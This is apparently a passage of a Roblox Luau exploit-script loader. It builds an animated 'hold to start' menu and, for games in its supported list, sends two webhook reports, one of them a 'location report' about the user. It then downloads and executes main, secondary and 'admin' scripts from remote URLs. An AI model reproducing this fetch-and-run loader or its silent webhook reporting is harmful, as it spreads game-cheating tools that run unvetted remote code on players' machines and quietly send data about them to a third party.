    MainScale.Scale = 0.92
    Main.BackgroundTransparency = 1
    SelTween(MainScale, 0.3, {Scale = 1}, Enum.EasingStyle.Back)
    SelTween(Main, 0.25, {BackgroundTransparency = 0})

    task.spawn(function()
        while AmbientGlow.Parent do
            SelTween(AmbientGlow, 5, {BackgroundTransparency = 0.35}, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            task.wait(5)
            SelTween(AmbientGlow, 5, {BackgroundTransparency = 0.15}, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            task.wait(5)
        end
    end)
end

-- ====== HOLD TO START ======
local Started, Holding = false, false

Start.MouseEnter:Connect(function()
    if Started or Holding then return end
    Tween(StartScale, 0.2, {Scale = 1.03}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    Tween(StartStroke, 0.2, {Color = RED_BRIGHT, Transparency = 0})
end)
Start.MouseLeave:Connect(function()
    if Started or Holding then return end
    Tween(StartScale, 0.3, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    Tween(StartStroke, 0.2, {Color = Color3.fromRGB(120, 15, 25), Transparency = 0.3})
end)

local function BeginStart()
    if Started or Holding then return end
    Holding = true
    ClickSound:Play()
    if SkipBtn and SkipBtn.Parent then SkipBtn:Destroy() end
    StartText.Text = "HOLDING..."
    Tween(StartScale, 0.1, {Scale = 0.94}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    Tween(StartStroke, 0.8, {Thickness = 3, Color = RED_BRIGHT, Transparency = 0})

    task.wait(0.8)
    if Holding and not Started then
        if not foundGame then
            Holding = false
            StartText.Text = "NOT SUPPORTED"
            StartSub.Text = "GAME NOT IN LIST"
            Tween(StartScale, 0.3, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            Tween(StartStroke, 0.2, {Thickness = 1.5, Color = Color3.fromRGB(120, 15, 25), Transparency = 0.3})
            task.wait(1.5)
            StartText.Text = "ENTER THE SCRIPT"
            StartSub.Text = "HOLD TO START"
            return
        end

        Started = true
        Holding = false
        StartText.Text = "EXECUTED"

        if foundGame.name == "TimeBomb Duels" then
            task.spawn(function()
                task.wait(0.3)
                clean()
                task.wait(0.6)
                ShowModeSelector()
            end)
            return
        end

        -- Other games: old flow
        local webhookDone = 0
        local webhookTotal = 2
        task.spawn(function() pcall(SendLocationReport); webhookDone = webhookDone + 1 end)
        task.spawn(function() pcall(SendSuccessReport); webhookDone = webhookDone + 1 end)

        local startWait = os.clock()
        while webhookDone < webhookTotal and os.clock() - startWait < 3 do
            task.wait(0.1)
        end

        local completedCount = 0
        local totalTasks = 1
        if foundGame.secondaryScriptUrl then totalTasks = totalTasks + 1 end
        if foundGame.adminScriptUrl then totalTasks = totalTasks + 1 end

        task.spawn(function()
            local ok = loadScriptFromUrl(foundGame.scriptUrl, 0)
            if not ok then ShowNotification("⚠️ Failed to load main script!", RED_BRIGHT) end
            completedCount = completedCount + 1
        end)
        if foundGame.secondaryScriptUrl then
            task.spawn(function()
                loadScriptFromUrl(foundGame.secondaryScriptUrl, 2)
                completedCount = completedCount + 1
            end)
        end
        if foundGame.adminScriptUrl then
            task.spawn(function()
                loadScriptFromUrl(foundGame.adminScriptUrl, 4)
                completedCount = completedCount + 1
            end)
        end

        local loadStart = os.clock()
        while completedCount < totalTasks and os.clock() - loadStart < 3 do
            task.wait(0.2)
        end

        if completedCount == totalTasks then
            ShowNotification("✅ All scripts loaded!", Color3.fromRGB(0, 255, 120))
        end
        task.wait(0.2)
        clean()
    end
end

local function CancelStart()
    if Started or not Holding then return end
    Holding = false
    Tween(StartScale, 0.35, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    Tween(StartStroke, 0.2, {Thickness = 1.5, Color = Color3.fromRGB(120, 15, 25), Transparency = 0.3})
    StartText.Text = "ENTER THE SCRIPT"
end

CloseBtn.MouseButton1Click:Connect(clean)
Start.MouseButton1Down:Connect(BeginStart)
Start.MouseButton1Up:Connect(CancelStart)
Start.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.Touch then BeginStart() end end)
Start.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.Touch then CancelStart() end end)

-- Show menu (instant if skipped)
task.wait(0.1)
if skipRequested then
    Menu.Position = UDim2.new(0.5, 0, 1, -18)
else
    Tween(Menu, 0.6, {Position = UDim2.new(0.5, 0, 1, -18)}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end